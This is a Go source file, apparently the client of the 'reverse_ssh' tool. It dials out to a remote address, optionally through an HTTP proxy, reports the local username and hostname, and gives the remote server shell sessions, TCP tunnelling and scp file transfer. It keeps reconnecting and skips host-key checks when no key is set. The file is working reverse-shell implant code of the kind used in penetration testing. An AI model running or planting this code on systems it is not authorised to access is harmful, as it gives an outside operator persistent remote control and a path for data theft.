package client

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"strings"
	"time"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/client/keys"
	"github.com/NHAS/reverse_ssh/internal/server/users"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
)

var shells []string

func loadShells() (shells []string) {
	file, err := os.Open("/etc/shells")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()

			if len(line) > 0 && line[0] == '#' || strings.TrimSpace(line) == "" {
				continue
			}
			shells = append(shells, strings.TrimSpace(line))
		}
	} else {
		shells = []string{
			"/bin/bash",
			"/bin/sh",
			"/bin/zsh",
			"/bin/ash",
		}

	}

	output := []string{}
	log.Println("Detected Shells: ")
	for _, s := range shells {

		if stats, err := os.Stat(s); err != nil && (os.IsNotExist(err) || !stats.IsDir()) {

			fmt.Printf("Rejecting Shell: '%s' Reason: %v\n", s, err)
			continue

		}
		output = append(output, s)
		fmt.Println("\t\t", s)
	}

	return output

}

func WriteHTTPReq(lines []string, conn net.Conn) error {
	lines = append(lines, "") // Add an empty line for completing the HTTP request
	for _, line := range lines {

		n, err := conn.Write([]byte(line + "\r\n"))
		if err != nil {
			return err
		}

		if len(line+"\r\n") < n {
			return io.ErrShortWrite
		}
	}
	return nil
}

func Connect(addr, proxy string, timeout time.Duration) (conn net.Conn, err error) {

	if len(proxy) != 0 {
		log.Println("Setting HTTP proxy address as: ", proxy)

		proxyCon, err := net.DialTimeout("tcp", proxy, timeout)
		if err != nil {
			return conn, err
		}

		req := []string{
			fmt.Sprintf("CONNECT %s HTTP/1.1", addr),
			fmt.Sprintf("Host: %s", addr),
		}

		err = WriteHTTPReq(req, proxyCon)
		if err != nil {
			return conn, fmt.Errorf("Unable to connect proxy %s", proxy)
		}

		var responseStatus []byte
		for {
			b := make([]byte, 1)
			_, err := proxyCon.Read(b)
			if err != nil {
				return conn, fmt.Errorf("Reading from proxy failed")
			}
			responseStatus = append(responseStatus, b...)

			if len(responseStatus) > 4 && bytes.Equal(responseStatus[len(responseStatus)-4:], []byte("\r\n\r\n")) {
				break
			}
		}

		if !bytes.Contains(bytes.ToLower(responseStatus), []byte("200 connection established")) {
			parts := bytes.Split(responseStatus, []byte("\r\n"))
			if len(parts) > 1 {
				return proxyCon, fmt.Errorf("Failed to proxy: '%s'", parts[0])
			}
		}

		log.Println("Proxy accepted CONNECT request, connection set up!")

		return proxyCon, nil
	}

	return net.DialTimeout("tcp", addr, timeout)
}

func Run(addr, serverPubKey, proxyAddr string, reconnect bool) {

	sshPriv, err := keys.GetPrivateKey()
	if err != nil {
		log.Fatal("Getting private key failed: ", err)
	}

	shells = loadShells()
	l := logger.NewLog("client")

	var username string
	userInfo, err := user.Current()
	if err != nil {
		l.Warning("Couldnt get username: %s", err.Error())
		username = "Unknown"
	} else {
		username = userInfo.Username
	}

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown Hostname"
		l.Warning("Couldnt get host name: %s", err)
	}

	config := &ssh.ClientConfig{
		User: fmt.Sprintf("%s@%s", username, hostname),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(sshPriv),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			if serverPubKey == "" { // If a server key isnt supplied, fail open. Potentially should change this for more paranoid people
				l.Warning("No server key specified, allowing connection to %s", addr)
				return nil
			}

			if internal.FingerprintSHA256Hex(key) != serverPubKey {
				return fmt.Errorf("Server public key invalid, expected: %s, got: %s", serverPubKey, internal.FingerprintSHA256Hex(key))
			}

			return nil
		},
	}

	once := true
	for ; once || reconnect; once = false { // My take on a golang do {} while loop :P
		log.Println("Connecting to ", addr)
		conn, err := Connect(addr, proxyAddr, config.Timeout)
		if err != nil {
			log.Printf("Unable to connect TCP: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}
		defer conn.Close()

		sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
		if err != nil {
			log.Printf("Unable to start a new client connection: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}
		defer sshConn.Close()

		go ssh.DiscardRequests(reqs) // Then go on to ignore everything else

		user, err := users.AddUser("server", sshConn)
		if err != nil {
			log.Fatalf("Unable to add user %s\n", err)
		}

		err = internal.RegisterChannelCallbacks(user, chans, l, map[string]internal.ChannelHandler{
			"session":      shellChannel,
			"direct-tcpip": proxyChannel,
			"scp":          scpChannel,
		})
		if err != nil {
			log.Printf("Server disconnected unexpectedly: %s\n", err)
			<-time.After(10 * time.Second)
			continue
		}

	}

}
